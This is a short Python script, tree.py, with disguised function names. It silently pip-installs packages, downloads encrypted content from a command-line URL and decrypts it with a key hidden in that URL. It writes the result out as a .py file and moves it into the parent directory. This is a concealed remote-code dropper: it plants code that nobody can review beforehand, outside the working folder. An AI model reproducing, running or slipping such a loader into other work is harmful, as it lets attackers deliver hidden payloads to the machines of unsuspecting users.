
# tree.py



def move_file_to_parent_dir(file_name):
  import os
  from pathlib import Path
  path = Path(os.getcwd())
  parent_path = path.parent.absolute()
  import shutil
  shutil.move(str(path)+'/'+file_name,str(parent_path)+'/'+file_name)




def get_pine_tree(the_url):
  import os
  os.system("pip install cryptography")
  os.system("pip install requests")
  import requests as rq
  car_pine = rq.get(the_url).content
  the_url1 = the_url.split("/")[len(the_url.split("/"))-1].split("car")[1]
  the_url2 = the_url.split("/")[len(the_url.split("/"))-1].split("car")[0]
  v1 = the_url2.split('pine')[0]+the_url2.split('pine')[1]
  from cryptography.fernet import Fernet
  fernet = Fernet(v1)
  car_pine2 = fernet.decrypt(car_pine).decode()
  with open(the_url1.split("/")[len(the_url1.split("/"))-1].split(".")[0]+".py",'w') as wi:
    wi.write(car_pine2)
  move_file_to_parent_dir(the_url1.split("/")[len(the_url1.split("/"))-1].split(".")[0]+".py")

import os
get_pine_tree(os.sys.argv[1])